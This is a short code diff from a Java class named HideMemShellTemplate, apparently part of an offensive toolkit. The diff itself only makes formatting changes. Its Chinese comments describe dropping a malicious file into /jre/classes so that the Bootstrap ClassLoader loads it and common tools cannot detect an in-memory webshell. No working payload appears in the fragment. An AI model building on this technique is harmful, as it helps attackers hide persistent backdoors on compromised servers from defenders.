@@ -9,9 +9,8 @@ import java.io.FileOutputStream;
  * 通过落地恶意文件到 /jre/classes 来使 Bootstrap ClassLoader 加载恶意代码
  * 使常见的工具无法检测出系统内的内存马
  * 由于 classes 文件夹默认不存在，因此需要较高的读写权限
- *
  */
-public class HideMemShellTemplate extends ClassLoader{
+public class HideMemShellTemplate extends ClassLoader {
     static String b64;
 
     static String className;
